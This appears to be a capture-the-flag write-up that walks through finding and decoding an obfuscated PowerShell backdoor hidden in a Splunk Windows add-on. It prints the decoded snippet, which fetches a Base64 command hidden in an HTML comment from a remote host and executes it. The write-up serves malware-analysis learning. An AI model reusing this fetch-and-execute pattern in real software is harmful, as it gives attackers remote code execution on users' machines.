...
## How to solve the challange:

Start by downloading the provided files.

After extracting the folder, examine the file structure. Navigate to the bin folder, as it contains executable files, which are likely candidates for containing a backdoor. Since executable files are more likely to contain malicious activity, I focused my attention there.

During a manual/semi-automated analysis of the files, I discovered some obfuscated code within a PowerShell script located at Splunk_TA_windows\bin\powershell\dns-health.ps1.
...
For easier readability and manipulation, I started by cleaning up the code structure. Here's how I did it:

Paste the code into Sublime Text.

Press Ctrl + H to open the "Find and Replace" dialog.

In the "Find" field, enter \s (whitespace).

Leave the "Replace" field empty.

Click "Replace All" to remove all whitespace.

After this, the output looks like this:
...
Lets take this to [cyberchef](https://gchq.github.io/CyberChef/) and decode.

Paste the code and choose the **Magic** option:
...
This seems like its base64 encoded, head to **Cyberchef** again to decode:

The output should be:
```
# $PORT below is dynamic to the running service of the `Start` button
@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic REDACTED BASE64 ")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
...
The PowerShell script makes a web request to a dynamic port with basic authorization. It extracts a Base64-encoded string hidden in an HTML comment, decodes it, and executes the decoded command. 

Lets run it, but first change the $PORT to the port given when you **start** .

```
./retrive-flag.ps1

answer: flag{REDACTED FLAG}
```
